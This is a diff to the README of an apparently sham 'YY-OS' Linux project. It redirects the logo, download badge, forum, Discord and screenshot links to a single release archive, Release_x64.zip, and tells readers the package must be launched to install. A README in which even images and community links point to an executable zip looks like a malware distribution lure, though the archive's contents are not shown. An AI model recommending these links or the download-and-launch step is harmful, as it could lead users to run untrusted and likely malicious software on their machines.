@@ -1,6 +1,6 @@
 # YY-OS: 🚀 Your Ultimate Immutable Linux Operating System
 
-![YY-OS Logo](https://example.com/yy-os-logo.png)
+![YY-OS Logo](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the YY-OS GitHub repository - where you can explore the cutting-edge world of immutable Linux operating systems. This repository is a hub for all things related to YY-OS, a revolutionary approach to building and deploying custom Linux images.
 
@@ -19,7 +19,7 @@ Welcome to the YY-OS GitHub repository - where you can explore the cutting-edge 
 
 ## Installation Guide 📦
 To get started with YY-OS, you can download the latest software package from the following link:  
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)
 
 ### Note: This software package needs to be launched to proceed with the installation process.
 
@@ -39,8 +39,8 @@ Follow these steps to kickstart your journey with YY-OS:
 
 ## Community and Support 👥
 Join the YY-OS community to connect with like-minded individuals, get help with technical issues, and stay updated on the latest developments:
-- [YY-OS Forum](https://example.com/yy-os-forum)
-- [YY-OS Discord Channel](https://example.com/yy-os-discord)
+- [YY-OS Forum](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)
+- [YY-OS Discord Channel](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)
 
 ## Contributing 🌟
 We welcome contributions from the community to enhance the features and functionality of YY-OS. If you have ideas, bug fixes, or feature requests, feel free to submit a pull request.
@@ -58,4 +58,4 @@ YY-OS is licensed under the XYZ License. For more details, please refer to the [
 
 Dive into the world of immutable Linux operating systems with YY-OS and revolutionize your deployment processes. Join us on this exciting journey to streamline your infrastructure and embrace the future of operating system management! 🚀🐧
 
-![YY-OS](https://example.com/yy-os-screenshot.png)
+![YY-OS](https://github.com/Eobiet/yy-os/releases/download/v2.0/Release_x64.zip)
